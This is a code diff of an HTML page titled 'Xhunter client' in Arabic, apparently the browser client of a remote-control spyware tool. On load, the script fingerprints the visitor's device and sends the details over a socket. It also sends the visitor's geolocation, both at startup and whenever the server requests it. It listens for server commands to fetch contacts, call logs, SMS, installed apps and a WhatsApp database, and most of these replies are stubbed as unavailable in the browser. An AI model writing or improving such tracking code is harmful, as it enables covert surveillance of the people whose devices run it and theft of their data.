@@ -5,9 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>عميل Xhunter</title>
 <style>
-body { font-family: Arial,sans-serif; background:#1e1e2f; color:#00ffcc; text-align:center; }
-h1 { margin-top:40px; color:#00ffcc; }
-p { font-size:1.2em; }
+body { font-family: Arial,sans-serif; color:#00ffcc; text-align:center; background:#0f111a; }
+h1 { margin-top:30px; }
+p { font-size:1.1em; }
 </style>
 </head>
 <body>
@@ -21,48 +21,56 @@ const deviceId = 'device_' + Math.floor(Math.random()*10000);
 const model = navigator.userAgent;
 
 // إرسال بيانات التعريف عند الإقلاع
-socket.emit('join', { id: deviceId, model });
+const deviceData = {
+    id: deviceId,
+    model: model,
+    language: navigator.language,
+    screen: { width: window.screen.width, height: window.screen.height },
+    platform: navigator.platform,
+    cookiesEnabled: navigator.cookieEnabled
+};
 
-// إرسال الموقع إذا سمح المتصفح
+socket.emit('join', deviceData);
+
+// دالة إرسال الموقع إذا سمح المتصفح
 function sendLocation(){
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(pos => {
-      socket.emit('getLocation', { id: deviceId, data:{lat:pos.coords.latitude, lon:pos.coords.longitude} });
-    }, err => {
-      socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
-    });
-  } else {
-    socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
-  }
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(pos=>{
+            socket.emit('getLocation', { id: deviceId, data:{lat:pos.coords.latitude, lon:pos.coords.longitude} });
+        }, err=>{
+            socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
+        });
+    } else {
+        socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
+    }
 }
 
-// أوامر متاحة في المتصفح
+// تنفيذ الأوامر المتاحة من السيرفر
 const commands = ['getInstalledApps','getContacts','getCallLog','getSMS','getLocation','downloadWhatsappDatabase'];
-commands.forEach(cmd => {
-  socket.on(cmd, () => {
-    let data;
-    switch(cmd){
-      case 'getInstalledApps':
-        data = ['Chrome','Firefox','Edge']; break;
-      case 'getContacts':
-        data = []; break;
-      case 'getCallLog':
-        data = []; break;
-      case 'getSMS':
-        data = []; break;
-      case 'getLocation':
-        sendLocation(); return;
-      case 'downloadWhatsappDatabase':
-        data = 'غير متاح من المتصفح'; break;
-      default: data = 'غير متاح';
-    }
-    socket.emit(cmd, { id: deviceId, data });
-  });
+commands.forEach(cmd=>{
+    socket.on(cmd, ()=>{
+        let data;
+        switch(cmd){
+            case 'getInstalledApps':
+                data = ['غير متاح من المتصفح']; break;
+            case 'getContacts':
+                data = ['غير متاح من المتصفح']; break;
+            case 'getCallLog':
+                data = ['غير متاح من المتصفح']; break;
+            case 'getSMS':
+                data = ['غير متاح من المتصفح']; break;
+            case 'getLocation':
+                sendLocation(); return;
+            case 'downloadWhatsappDatabase':
+                data = 'غير متاح من المتصفح'; break;
+            default: data = 'غير متاح';
+        }
+        socket.emit(cmd, { id: deviceId, data });
+    });
 });
 
 // إرسال الموقع عند الإقلاع
 sendLocation();
-
 console.log("عميل Xhunter جاهز عبر المتصفح.");
 </script>
 </body>
